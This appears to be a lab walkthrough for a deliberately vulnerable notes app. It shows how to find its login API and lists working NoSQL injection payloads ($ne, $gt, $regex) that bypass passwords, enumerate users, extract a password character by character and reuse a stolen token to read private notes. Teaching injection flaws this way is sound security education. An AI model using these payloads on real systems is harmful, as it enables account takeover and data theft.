Step 0: How an Attacker Discovers API Routes

  1. Open the target website and press F12 to open DevTools
  2. Go to Network tab, then try to login with any credentials
  3. You'll see a request to POST /api/auth/login — that's the endpoint!
  4. Or simply right-click → View Page Source and search for fetch or /api/
  5. The HTML source reveals: action="/api/auth/login" and fetch('/api/auth/login')
  6. Once logged in, the Network tab also reveals GET /api/notes, POST /api/notes, etc.

Attack 1: Password Bypass ($ne)

CRITICAL

Login as admin without knowing the password. The $ne operator means "not equal to" — so password matches anything that isn't an empty string.

{ "username": "admin", "password": { "$ne": "" } }

Attack 2: Blind Login ($gt)

CRITICAL

Login without knowing ANY credentials at all. $gt: "" matches any non-empty string — returns the first user in the database.

{ "username": { "$gt": "" }, "password": { "$gt": "" } }

Attack 3: User Enumeration ($regex)

HIGH

Discover usernames by trying different starting letters. $regex: "^s" finds users whose name starts with "s".

{ "username": { "$regex": "^s" }, "password": { "$gt": "" } }

Attack 4: Password Extraction ($regex)

CRITICAL

Extract admin's password character by character using regex. Try ^a, ^ad, ^adm... until the full password is found.

{ "username": "admin", "password": { "$regex": "^a" } }

Attack 5: Target Specific User

CRITICAL

Login as student2 specifically, bypassing their password. $ne matches because the real password is never "wrongpassword".

{ "username": "student2", "password": { "$ne": "wrongpassword" } }

Attack 6: Steal User's Notes

CRITICAL

After any successful injection above, use the stolen token to access that user's private notes.

GET /api/notes Authorization: Bearer <STOLEN_TOKEN>
